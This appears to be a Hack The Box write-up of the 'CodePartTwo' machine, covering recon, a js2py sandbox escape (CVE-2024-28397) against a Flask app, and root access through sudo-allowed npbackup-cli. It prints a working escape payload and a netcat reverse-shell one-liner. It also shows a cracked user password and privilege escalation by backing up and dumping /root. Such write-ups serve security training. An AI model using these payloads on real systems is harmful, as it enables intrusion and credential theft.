---
title: "HTB: CodePartTwo"
date: 2025-10-06 00:00 +0800
categories: [HTB]
tags: [HTB,Easy, CVE-2024-28397, File Misconfiguration, js2py]
image: https://github.com/user-attachments/assets/0bb52df1-3552-425a-bbb5-42a7bde1cb38
---


<img width="872" height="339" alt="image" src="https://github.com/user-attachments/assets/0bb52df1-3552-425a-bbb5-42a7bde1cb38" />

Found a web app that runs JavaScript, and spotted a vulnerable js2py version. Using that flaw we got a shell as the app user, found credentials in the database to become marco, and then used a backup tool that ran as root to read the final flag.

## Recon 

Nmap scan result: 
```
┌──(kali㉿kali)-[~/Desktop/HTB/CodePartTwo]
└─$ sudo nmap -sCV -p- -T4 -oA nmap/ codeparttwo.htb
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-16 21:58 +08
Nmap scan report for codeparttwo.htb (10.10.11.82)
Host is up (0.018s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-title: Welcome to CodePartTwo
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.74 seconds
```

## Initial Enumeration

CodePartTwo is open-source, platform designed to help developers quickly write, save, and run their JavaScript code. Required user to authenticated before can actually use further funtionalities
<img width="1914" height="702" alt="image" src="https://github.com/user-attachments/assets/93298373-93d8-4be9-b6fb-08adc3e7c0e3" />

First we figured from **404 pages** it actually a flask web app. Learned from **[0xdf](https://0xdf.gitlab.io/cheatsheets/404)**

<img width="1141" height="214" alt="image" src="https://github.com/user-attachments/assets/249b5dae-de27-400a-bfd0-fad11f4abdc4" />

In the first phase of recon, i would usually start to look for any known cve's, and for this box. 
We find that it actually used `js2py=0.74` based on the **requirements.txt** from source code given.


### CVE-2024-28397

```
┌──(kali㉿kali)-[~/Desktop/HTB/CodePartTwo]                                                                                                                                                                                                
└─$ unzip app.zip                                                                                                                                                                                                                          
Archive:  app.zip                                                                                                                                                                                                                          
   creating: app/                                                                                                                                                                                                                          
   creating: app/static/                                                                                                                                                                                                                   
   creating: app/static/css/                                                                                                                                                                                                               
  inflating: app/static/css/styles.css                                                                                                                                                                                                     
   creating: app/static/js/                                                                                                                                                                                                                
  inflating: app/static/js/script.js                                                                                                                                                                                                       
  inflating: app/app.py                                                                                                                                                                                                                    
   creating: app/templates/                                                                                                                                                                                                                
  inflating: app/templates/dashboard.html                                                                                                                                                                                                  
  inflating: app/templates/reviews.html                                                                                                                                                                                                    
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/templates/register.html  
  inflating: app/templates/login.html  
  inflating: app/requirements.txt    
   creating: app/instance/
  inflating: app/instance/users.db   

┌──(kali㉿kali)-[~/Desktop/HTB/CodePartTwo]
└─$ cat app/requirements.txt
flask==3.0.3
flask-sqlalchemy==3.1.1
js2py==0.74
```
The vulnerability occurs because the `disable_pyimport()` method does not properly prevent access to Python objects from JavaScript code. This allows an attacker, even with protection enabled, to access Python objects and execute arbitrary commands on the system. You find it **[here](https://github.com/Ghost-Overflow/CVE-2024-28397-command-execution-poc)** for further reading.

This affected component `js2py.disable_pyimport()` and versions `Up to v0.74`

Here is the source code from **app.py**:
```
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, send_from_directory
from flask_sqlalchemy import SQLAlchemy
import hashlib
import js2py
import os
import json

js2py.disable_pyimport()
app = Flask(__name__)
app.secret_key = 'S3cr3tK3yC0d3PartTw0'
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///users.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password_hash = db.Column(db.String(128), nullable=False)

class CodeSnippet(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    code = db.Column(db.Text, nullable=False)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/dashboard')
def dashboard():
    if 'user_id' in session:
        user_codes = CodeSnippet.query.filter_by(user_id=session['user_id']).all()
        return render_template('dashboard.html', codes=user_codes)
    return redirect(url_for('login'))

@app.route('/register', methods=['GET', 'POST'])
def register():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        new_user = User(username=username, password_hash=password_hash)
        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for('login'))
    return render_template('register.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        password_hash = hashlib.md5(password.encode()).hexdigest()
        user = User.query.filter_by(username=username, password_hash=password_hash).first()
        if user:
            session['user_id'] = user.id
            session['username'] = username;
            return redirect(url_for('dashboard'))
        return "Invalid credentials"
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.pop('user_id', None)
    return redirect(url_for('index'))

@app.route('/save_code', methods=['POST'])
def save_code():
    if 'user_id' in session:
        code = request.json.get('code')
        new_code = CodeSnippet(user_id=session['user_id'], code=code)
        db.session.add(new_code)
        db.session.commit()
        return jsonify({"message": "Code saved successfully"})
    return jsonify({"error": "User not logged in"}), 401

@app.route('/download')
def download():
    return send_from_directory(directory='/home/app/app/static/', path='app.zip', as_attachment=True)

@app.route('/delete_code/<int:code_id>', methods=['POST'])
def delete_code(code_id):
    if 'user_id' in session:
        code = CodeSnippet.query.get(code_id)
        if code and code.user_id == session['user_id']:
            db.session.delete(code)
            db.session.commit()
            return jsonify({"message": "Code deleted successfully"})
        return jsonify({"error": "Code not found"}), 404
    return jsonify({"error": "User not logged in"}), 401

@app.route('/run_code', methods=['POST'])
def run_code():
    try:
        code = request.json.get('code')
        result = js2py.eval_js(code)
        return jsonify({'result': result})
    except Exception as e:
        return jsonify({'error': str(e)})

if __name__ == '__main__':
    with app.app_context():
        db.create_all()
    app.run(host='0.0.0.0', debug=True)
```

Here is the payload.js to test the poc weather its actually vuln or not
```
let cmd = "whoami"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for (let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if (item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if (item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

// run the command and force UTF-8 string output
let proc = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true)
let out = proc.communicate()[0].decode("utf-8")

// return a plain string (JSON-safe)
"" + out
```

We get a **whoami** responding with `app`, meaning its working. We can proceed with getting a shell

<img width="1083" height="234" alt="image" src="https://github.com/user-attachments/assets/da17cdcc-78dd-4165-860c-4b8289bb53de" />

Change cmd from `whoami` to our reverse shell payload:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.87 4444 >/tmp/f
```

Setup a listener
```
┌──(kali㉿kali)-[~/Desktop/HTB/CodePartTwo]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 172.17.0.1 • 10.10.14.87
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

## Shell as app
```
┌──(kali㉿kali)-[~/Desktop/HTB/CodePartTwo]
└─$ penelope
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 172.17.0.1 • 10.10.14.87
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from codeparttwo~10.10.11.82-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/codeparttwo~10.10.11.82-Linux-x86_64/2025_11_16-22_56_40-255.log 📜
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[+] Got reverse shell from codeparttwo~10.10.11.82-Linux-x86_64 😍 Assigned SessionID <2>
app@codeparttwo:~/app$ 
```

### users.db

```
app@codeparttwo:~/app/instance$ sqlite3 users.db 
SQLite version 3.31.1 2020-01-27 19:55:54
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user        
sqlite> select * from user;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|ello|9ecb0b2f7994a8a3a2919212f764b81a
```

<img width="1068" height="400" alt="image" src="https://github.com/user-attachments/assets/cc19d758-2368-4f28-85f0-e193c04e52e4" />

`marco:sweetangelbabylove`

## Shell as marco

### user.txt
```
app@codeparttwo:~/app/instance$ su marco
Password: sweetangelbabylove
marco@codeparttwo:/home/app/app/instance$ cd /home/marco/
marco@codeparttwo:~$ ls -lah
total 56K
drwxr-x--- 6 marco marco 4.0K Nov 16 15:00 .
drwxr-xr-x 4 root  root  4.0K Jan  2  2025 ..
drwx------ 7 root  root  4.0K Apr  6  2025 backups
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .bash_history -> /dev/null
-rw-r--r-- 1 marco marco  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 marco marco 3.7K Feb 25  2020 .bashrc
drwx------ 2 marco marco 4.0K Apr  6  2025 .cache
drwxrwxr-x 4 marco marco 4.0K Feb  1  2025 .local
lrwxrwxrwx 1 root  root     9 Nov 17  2024 .mysql_history -> /dev/null
-rw-rw-r-- 1 marco marco 2.9K Nov 16 14:55 npbackup.conf
-rw------- 1 marco marco  12K Nov 16 09:48 .npbackup.conf.swo
-rw-r--r-- 1 marco marco  807 Feb 25  2020 .profile
lrwxrwxrwx 1 root  root     9 Oct 26  2024 .python_history -> /dev/null
lrwxrwxrwx 1 root  root     9 Oct 31  2024 .sqlite_history -> /dev/null
drwx------ 2 marco marco 4.0K Oct 20  2024 .ssh
-rw-r----- 1 root  marco   33 Nov 16 07:02 user.txt
marco@codeparttwo:~$ cat user.txt
c6d459d035551f0ebe3b49dac4d846bd
```

### Discovery

Marco was able to run `/usr/local/bin/npbackup-cli` with sudo priv 
```
marco@codeparttwo:~$ sudo -l
Matching Defaults entries for marco on codeparttwo:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codeparttwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```
It required config files:
```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli
2025-11-16 15:15:48,852 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-11-16 15:15:48,853 :: CRITICAL :: Cannot run without configuration file.
2025-11-16 15:15:48,857 :: INFO :: ExecTime = 0:00:00.006464, finished, state is: critical.
```
`/usr/local/bin/npbackup-cli` help menu:
```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli --help
usage: npbackup-cli [-h] [-c CONFIG_FILE] [--repo-name REPO_NAME] [--repo-group REPO_GROUP] [-b] [-f] [-r RESTORE]
                    [-s] [--ls [LS]] [--find FIND] [--forget FORGET] [--policy] [--housekeeping] [--quick-check]
                    [--full-check] [--check CHECK] [--prune [PRUNE]] [--prune-max] [--unlock] [--repair-index]
                    [--repair-packs REPAIR_PACKS] [--repair-snapshots] [--repair REPAIR] [--recover] [--list LIST]
                    [--dump DUMP] [--stats [STATS]] [--raw RAW] [--init] [--has-recent-snapshot]
                    [--restore-includes RESTORE_INCLUDES] [--snapshot-id SNAPSHOT_ID] [--json] [--stdin]
                    [--stdin-filename STDIN_FILENAME] [-v] [-V] [--dry-run] [--no-cache] [--license]
                    [--auto-upgrade] [--log-file LOG_FILE] [--show-config]
                    [--external-backend-binary EXTERNAL_BACKEND_BINARY] [--group-operation GROUP_OPERATION]
                    [--create-key CREATE_KEY] [--create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK]
                    [--create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK] [--check-config-file]

Portable Network Backup Client This program is distributed under the GNU General Public License and comes with
ABSOLUTELY NO WARRANTY. This is free software, and you are welcome to redistribute it under certain conditions;
Please type --license for more info.

optional arguments:
  -h, --help            show this help message and exit
  -c CONFIG_FILE, --config-file CONFIG_FILE
                        Path to alternative configuration file (defaults to current dir/npbackup.conf)
  --repo-name REPO_NAME
                        Name of the repository to work with. Defaults to 'default'. This can also be a comma
                        separated list of repo names. Can accept special name '__all__' to work with all
                        repositories.
  --repo-group REPO_GROUP
                        Comme separated list of groups to work with. Can accept special name '__all__' to work with
                        all repositories.
  -b, --backup          Run a backup
  -f, --force           Force running a backup regardless of existing backups age
  -r RESTORE, --restore RESTORE
                        Restore to path given by --restore, add --snapshot-id to specify a snapshot other than
                        latest
  -s, --snapshots       Show current snapshots
  --ls [LS]             Show content given snapshot. When no snapshot id is given, latest is used
  --find FIND           Find full path of given file / directory
  --forget FORGET       Forget given snapshot (accepts comma separated list of snapshots)
  --policy              Apply retention policy to snapshots (forget snapshots)
  --housekeeping        Run --check quick, --policy and --prune in one go
  --quick-check         Deprecated in favor of --'check quick'. Quick check repository
  --full-check          Deprecated in favor of '--check full'. Full check repository (read all data)
  --check CHECK         Checks the repository. Valid arguments are 'quick' (metadata check) and 'full' (metadata +
                        data check)
  --prune [PRUNE]       Prune data in repository, also accepts max parameter in order prune reclaiming maximum
                        space
  --prune-max           Deprecated in favor of --prune max
  --unlock              Unlock repository
  --repair-index        Deprecated in favor of '--repair index'.Repair repo index
  --repair-packs REPAIR_PACKS
                        Deprecated in favor of '--repair packs'. Repair repo packs ids given by --repair-packs
  --repair-snapshots    Deprecated in favor of '--repair snapshots'.Repair repo snapshots
  --repair REPAIR       Repair the repository. Valid arguments are 'index', 'snapshots', or 'packs'
  --recover             Recover lost repo snapshots
  --list LIST           Show [blobs|packs|index|snapshots|keys|locks] objects
  --dump DUMP           Dump a specific file to stdout (full path given by --ls), use with --dump [file], add
                        --snapshot-id to specify a snapshot other than latest
  --stats [STATS]       Get repository statistics. If snapshot id is given, only snapshot statistics will be shown.
                        You may also pass "--mode raw-data" or "--mode debug" (with double quotes) to get full repo
                        statistics
  --raw RAW             Run raw command against backend. Use with --raw "my raw backend command"
  --init                Manually initialize a repo (is done automatically on first backup)
  --has-recent-snapshot
                        Check if a recent snapshot exists
  --restore-includes RESTORE_INCLUDES
                        Restore only paths within include path, comma separated list accepted
  --snapshot-id SNAPSHOT_ID
                        Choose which snapshot to use. Defaults to latest
  --json                Run in JSON API mode. Nothing else than JSON will be printed to stdout
  --stdin               Backup using data from stdin input
  --stdin-filename STDIN_FILENAME
                        Alternate filename for stdin, defaults to 'stdin.data'
  -v, --verbose         Show verbose output
  -V, --version         Show program version
  --dry-run             Run operations in test mode, no actual modifications
  --no-cache            Run operations without cache
  --license             Show license
  --auto-upgrade        Auto upgrade NPBackup
  --log-file LOG_FILE   Optional path for logfile
  --show-config         Show full inherited configuration for current repo. Optionally you can set
                        NPBACKUP_MANAGER_PASSWORD env variable for more details.
  --external-backend-binary EXTERNAL_BACKEND_BINARY
                        Full path to alternative external backend binary
  --group-operation GROUP_OPERATION
                        Deprecated command to launch operations on multiple repositories. Not needed anymore.
                        Replaced by --repo-name x,y or --repo-group x,y
  --create-key CREATE_KEY
                        Create a new encryption key, requires a file path
  --create-backup-scheduled-task CREATE_BACKUP_SCHEDULED_TASK
                        Create a scheduled backup task, specify an argument interval via interval=minutes, or
                        hour=hour,minute=minute for a daily task
  --create-housekeeping-scheduled-task CREATE_HOUSEKEEPING_SCHEDULED_TASK
                        Create a scheduled housekeeping task, specify hour=hour,minute=minute for a daily task
  --check-config-file   Check if config file is valid
```

because this is public free machine, it's better for me to exploit the conf file through **/tmp**, that's why we will copy the `.conf` as we saw when listing files from marco folder  
```
marco@codeparttwo:~$ cp npbackup.conf /tmp/mal.conf
```
We will then change the path to root
```
paths: 
+ - /root
- - /home/app/app/
```
Here's the full one:
```
marco@codeparttwo:~$ nano /tmp/mal.conf
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/mal.conf -b
2025-11-16 15:02:01,180 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-11-16 15:02:01,198 :: INFO :: Loaded config E1057128 in /tmp/mal.conf
2025-11-16 15:02:01,205 :: INFO :: Searching for a backup newer than 1 day, 0:00:00 ago
2025-11-16 15:02:02,732 :: INFO :: Snapshots listed successfully
2025-11-16 15:02:02,733 :: INFO :: No recent backup found in repo default. Newest is from 2025-04-06 03:50:16.222832+00:00
2025-11-16 15:02:02,733 :: INFO :: Runner took 1.527629 seconds for has_recent_snapshot
2025-11-16 15:02:02,733 :: INFO :: Running backup of ['/root'] to repo default
2025-11-16 15:02:03,470 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excluded_extensions
2025-11-16 15:02:03,470 :: ERROR :: Exclude file 'excludes/generic_excluded_extensions' not found
2025-11-16 15:02:03,470 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/generic_excludes
2025-11-16 15:02:03,470 :: ERROR :: Exclude file 'excludes/generic_excludes' not found
2025-11-16 15:02:03,470 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/windows_excludes
2025-11-16 15:02:03,470 :: ERROR :: Exclude file 'excludes/windows_excludes' not found
2025-11-16 15:02:03,470 :: INFO :: Trying to expanding exclude file path to /usr/local/bin/excludes/linux_excludes
2025-11-16 15:02:03,471 :: ERROR :: Exclude file 'excludes/linux_excludes' not found
2025-11-16 15:02:03,471 :: WARNING :: Parameter --use-fs-snapshot was given, which is only compatible with Windows
no parent snapshot found, will read all files

Files:          15 new,     0 changed,     0 unmodified
Dirs:            8 new,     0 changed,     0 unmodified
Added to the repository: 190.612 KiB (39.886 KiB stored)

processed 15 files, 197.660 KiB in 0:00
snapshot 58a95d3f saved
2025-11-16 15:02:04,230 :: INFO :: Backend finished with success
2025-11-16 15:02:04,231 :: INFO :: Processed 197.7 KiB of data
2025-11-16 15:02:04,231 :: ERROR :: Backup is smaller than configured minmium backup size
2025-11-16 15:02:04,231 :: ERROR :: Operation finished with failure
2025-11-16 15:02:04,231 :: INFO :: Runner took 3.026626 seconds for backup
2025-11-16 15:02:04,231 :: INFO :: Operation finished
2025-11-16 15:02:04,236 :: INFO :: ExecTime = 0:00:03.056974, finished, state is: errors.
marco@codeparttwo:~$ cat /tmp/mal.conf
conf_version: 3.0.1
audience: public
repos:
  default:
    repo_uri:
      __NPBACKUP__wd9051w9Y0p4ZYWmIxMqKHP81/phMlzIOYsL01M9Z7IxNzQzOTEwMDcxLjM5NjQ0Mg8PDw8PDw8PDw8PDw8PD6yVSCEXjl8/9rIqYrh8kIRhlKm4UPcem5kIIFPhSpDU+e+E__NPBACKUP__
    repo_group: default_group
    backup_opts:
      paths:
      - /root
      source_type: folder_list
      exclude_files_larger_than: 0.0
    repo_opts:
      repo_password:
        __NPBACKUP__v2zdDN21b0c7TSeUZlwezkPj3n8wlR9Cu1IJSMrSctoxNzQzOTEwMDcxLjM5NjcyNQ8PDw8PDw8PDw8PDw8PD0z8n8DrGuJ3ZVWJwhBl0GHtbaQ8lL3fB0M=__NPBACKUP__
      retention_policy: {}
      prune_max_unused: 0
    prometheus: {}
    env: {}
    is_protected: false
groups:
  default_group:
    backup_opts:
      paths: []
      source_type:
      stdin_from_command:
      stdin_filename:
      tags: []
      compression: auto
      use_fs_snapshot: true
      ignore_cloud_files: true
      one_file_system: false
      priority: low
      exclude_caches: true
      excludes_case_ignore: false
      exclude_files:
      - excludes/generic_excluded_extensions
      - excludes/generic_excludes
      - excludes/windows_excludes
      - excludes/linux_excludes
      exclude_patterns: []
      exclude_files_larger_than:
      additional_parameters:
      additional_backup_only_parameters:
      minimum_backup_size_error: 10 MiB
      pre_exec_commands: []
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
      post_exec_commands: []
      post_exec_per_command_timeout: 3600
      post_exec_failure_is_fatal: false
      post_exec_execute_even_on_backup_error: true
      post_backup_housekeeping_percent_chance: 0
      post_backup_housekeeping_interval: 0
    repo_opts:
      repo_password:
      repo_password_command:
      minimum_backup_age: 1440
      upload_speed: 800 Mib
      download_speed: 0 Mib
      backend_connections: 0
      retention_policy:
        last: 3
        hourly: 72
        daily: 30
        weekly: 4
        monthly: 12
        yearly: 3
        tags: []
        keep_within: true
        group_by_host: true
        group_by_tags: true
        group_by_paths: false
        ntp_server:
      prune_max_unused: 0 B
      prune_max_repack_size:
    prometheus:
      backup_job: ${MACHINE_ID}
      group: ${MACHINE_GROUP}
    env:
      env_variables: {}
      encrypted_env_variables: {}
    is_protected: false
identity:
  machine_id: ${HOSTNAME}__blw0
  machine_group:
global_prometheus:
  metrics: false
  instance: ${MACHINE_ID}
  destination:
  http_username:
  http_password:
  additional_labels: {}
  no_cert_verify: false
global_options:
  auto_upgrade: false
  auto_upgrade_percent_chance: 5
  auto_upgrade_interval: 15
  auto_upgrade_server_url:
  auto_upgrade_server_username:
  auto_upgrade_server_password:
  auto_upgrade_host_identity: ${MACHINE_ID}
  auto_upgrade_group: ${MACHINE_GROUP}
```
List the snapshots to make sure its taken correctly:
```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/mal.conf -s
2025-11-16 15:02:51,855 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-11-16 15:02:51,873 :: INFO :: Loaded config E1057128 in /tmp/mal.conf
2025-11-16 15:02:51,881 :: INFO :: Listing snapshots of repo default
ID        Time                 Host         Tags        Paths          Size
----------------------------------------------------------------------------------
35a4dac3  2025-04-06 03:50:16  codetwo                  /home/app/app  48.295 KiB
58a95d3f  2025-11-16 15:02:03  codeparttwo              /root          197.660 KiB
----------------------------------------------------------------------------------
2 snapshots
2025-11-16 15:02:53,359 :: INFO :: Snapshots listed successfully
2025-11-16 15:02:53,360 :: INFO :: Runner took 1.479289 seconds for snapshots
2025-11-16 15:02:53,360 :: INFO :: Operation finished
2025-11-16 15:02:53,366 :: INFO :: ExecTime = 0:00:01.512144, finished, state is: success.
```
### root.txt
```
marco@codeparttwo:~$ sudo /usr/local/bin/npbackup-cli -c /tmp/mal.conf --dump /root/root.txt
07cd4de8611f83eae09527bfa1f7f062
```

[Badge](https://labs.hackthebox.com/achievement/machine/1737187/692)
